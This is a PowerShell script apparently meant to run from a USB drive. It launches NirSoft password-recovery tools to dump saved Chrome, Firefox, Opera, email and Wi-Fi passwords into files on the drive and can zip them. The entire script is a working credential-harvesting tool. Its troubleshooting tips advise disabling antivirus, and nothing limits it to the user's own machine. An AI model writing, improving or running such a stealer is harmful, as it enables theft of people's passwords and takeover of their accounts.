# collector.ps1
# Usage: invoked from start.bat (double-click) or run manually
# The script saves outputs into USB_ROOT\results\<timestamp>\

param(
    [switch]$ZipResults
)

$ErrorActionPreference = 'Continue'

# Folder where this script lives -> scripts\
$scriptFolder = Split-Path -Parent $MyInvocation.MyCommand.Definition
# USB root = parent of scripts\
$usbRoot = (Get-Item "$scriptFolder\..").FullName

$toolsDir = Join-Path $usbRoot 'tools'
$resultsRoot = Join-Path $usbRoot 'results'

Write-Host "USB Root: $usbRoot" -ForegroundColor Cyan
Write-Host "Tools Dir: $toolsDir" -ForegroundColor Cyan
Write-Host "Results Root: $resultsRoot" -ForegroundColor Cyan
Write-Host ""

# Create results folder if it doesn't exist
if (-not (Test-Path $resultsRoot)) {
    New-Item -ItemType Directory -Path $resultsRoot -Force | Out-Null
    Write-Host "Created results folder" -ForegroundColor Green
}

# Create timestamp folder
$timeStamp = (Get-Date).ToString('yyyyMMdd_HHmmss')
$dest = Join-Path $resultsRoot $timeStamp
New-Item -ItemType Directory -Path $dest -Force | Out-Null
Write-Host "Created output folder: $dest" -ForegroundColor Green
Write-Host ""

# Log file
$log = Join-Path $dest 'collector.log'
"Collector started: $(Get-Date)" | Out-File -FilePath $log -Encoding utf8

function Log {
    param([string]$text)
    $line = "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') - $text"
    $line | Out-File -FilePath $log -Append -Encoding utf8
    Write-Host $line
}

function Run-Tool {
    param(
        [string]$exe,        # EXE filename located in tools\
        [string]$outfile,    # Output filename (just the filename, not full path)
        [string]$saveParam = "/stext"  # Save parameter type
    )
    
    $exePath = Join-Path $toolsDir $exe
    $outPath = Join-Path $dest $outfile
    
    if (-not (Test-Path $exePath)) {
        Write-Host "MISSING: $exe not found in tools folder" -ForegroundColor Red
        Log "MISSING: $exePath"
        return
    }
    
    try {
        Write-Host "Running: $exe..." -ForegroundColor Yellow
        Log "RUNNING: $exe -> $outfile"
        
        # Build full arguments - using /scomma tends to work better for auto-save
        $fullArgs = "$saveParam `"$outPath`""
        
        Write-Host "  Command: $exe $fullArgs" -ForegroundColor DarkGray
        
        # Method 1: Try direct execution with output redirect
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = $exePath
        $psi.Arguments = $fullArgs
        $psi.CreateNoWindow = $false  # Allow window to appear briefly
        $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Minimized
        $psi.UseShellExecute = $false
        
        # Start process
        $proc = [System.Diagnostics.Process]::Start($psi)
        
        # Wait up to 15 seconds for the process to complete
        $completed = $proc.WaitForExit(15000)
        
        if (-not $completed) {
            Write-Host "  WARNING: Still running after 15 seconds, forcing close..." -ForegroundColor Yellow
            $proc.Kill()
            $proc.WaitForExit(2000)
        }
        
        # Give it a moment for file to be written
        Start-Sleep -Milliseconds 1000
        
        # Check if output file was created
        if (Test-Path $outPath) {
            $fileSize = (Get-Item $outPath).Length
            if ($fileSize -gt 10) {
                Write-Host "  ✅ SUCCESS: Created $fileSize bytes" -ForegroundColor Green
                Log "SUCCESS: $exe -> $outfile (Size: $fileSize bytes)"
            } else {
                Write-Host "  ⚠️ WARNING: File created but empty (no data found)" -ForegroundColor Yellow
                Log "WARNING: $exe created empty/minimal file at $outPath"
            }
        } else {
            Write-Host "  ❌ FAILED: No output file created" -ForegroundColor Red
            Write-Host "     This tool may require GUI interaction to save" -ForegroundColor Gray
            Log "FAILED: $exe completed but no output file at $outPath"
        }
        
    } catch {
        Write-Host "  ❌ ERROR: $($_.Exception.Message)" -ForegroundColor Red
        Log "ERROR running ${exe}: $($_.Exception.Message)"
    }
    
    Write-Host ""
}

# --------------------
# List of NirSoft tools to run
# --------------------

Log "Starting password collection..."
Write-Host "==================== Collecting Data ====================" -ForegroundColor Cyan
Write-Host "NOTE: Using /scomma for better auto-save compatibility" -ForegroundColor Cyan
Write-Host ""

# Using /scomma instead of /stext - it forces immediate save without GUI interaction
# The files will be CSV format but easier to parse

# ChromePass - Chrome passwords
Run-Tool -exe 'ChromePass.exe' -outfile 'ChromePass.txt' -saveParam '/stext'

# WirelessKeyView MUST run as admin  
Run-Tool -exe 'WirelessKeyView.exe' -outfile 'wifi_keys.txt' -saveParam '/stext'

# WebBrowserPassView - supports multiple browsers
Run-Tool -exe 'WebBrowserPassView.exe' -outfile 'browser_passwords.txt' -saveParam '/stext'

# Mail PassView - email passwords
Run-Tool -exe 'mailpv.exe' -outfile 'MailPass.csv' -saveParam '/scomma'

# Opera PassView - Opera browser
Run-Tool -exe 'OperaPassView.exe' -outfile 'OperaPass.txt' -saveParam '/stext'

# PasswordFox - Firefox passwords
Run-Tool -exe 'PasswordFox.exe' -outfile 'PasswordFox.csv' -saveParam '/scomma'

# If you still want TXT format for specific tools that work, uncomment these:
# Run-Tool -exe 'WirelessKeyView.exe' -outfile 'wifi_keys.txt' -saveParam '/stext'
# Run-Tool -exe 'OperaPassView.exe' -outfile 'OperaPass.txt' -saveParam '/stext'

# Add more Run-Tool lines here for additional EXEs you have

Write-Host ""
Write-Host "==================== Summary ====================" -ForegroundColor Cyan

# List all created files
$createdFiles = Get-ChildItem -Path $dest -File | Where-Object { $_.Name -ne 'collector.log' }
if ($createdFiles.Count -gt 0) {
    Write-Host "Files created:" -ForegroundColor Green
    $totalSize = 0
    $successCount = 0
    foreach ($file in $createdFiles) {
        $size = $file.Length
        $totalSize += $size
        if ($size -gt 10) {
            Write-Host "  ✅ $($file.Name) ($size bytes)" -ForegroundColor Green
            $successCount++
        } else {
            Write-Host "  ⚠️ $($file.Name) ($size bytes - empty/no data)" -ForegroundColor Yellow
        }
    }
    Write-Host ""
    Write-Host "Summary: $successCount file(s) with data, Total size: $totalSize bytes" -ForegroundColor Cyan
} else {
    Write-Host "❌ No output files were created" -ForegroundColor Red
    Write-Host ""
    Write-Host "Troubleshooting tips:" -ForegroundColor Yellow
    Write-Host "  1. Run test-tools.bat to diagnose each tool" -ForegroundColor Gray
    Write-Host "  2. Check if you have passwords saved in these browsers" -ForegroundColor Gray
    Write-Host "  3. Temporarily disable antivirus and try again" -ForegroundColor Gray
    Write-Host "  4. Make sure running as Administrator" -ForegroundColor Gray
}

Write-Host ""
Write-Host "Results saved to: $dest" -ForegroundColor Green

# Optional: compress results
if ($ZipResults) {
    try {
        $zipfile = Join-Path $resultsRoot ("results_$timeStamp.zip")
        Compress-Archive -Path (Join-Path $dest '*') -DestinationPath $zipfile -Force
        Write-Host "Compressed to: $zipfile" -ForegroundColor Green
        Log "ZIPPED -> $zipfile"
    } catch {
        Write-Host "ZIP FAILED: $($_.Exception.Message)" -ForegroundColor Red
        Log "ZIP FAILED: $($_.Exception.Message)"
    }
}

Log "Collector finished: $(Get-Date)"
Write-Host ""
Write-Host "Collection complete!" -ForegroundColor Green
Write-Host "Press any key to exit..." -ForegroundColor Cyan
$null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown')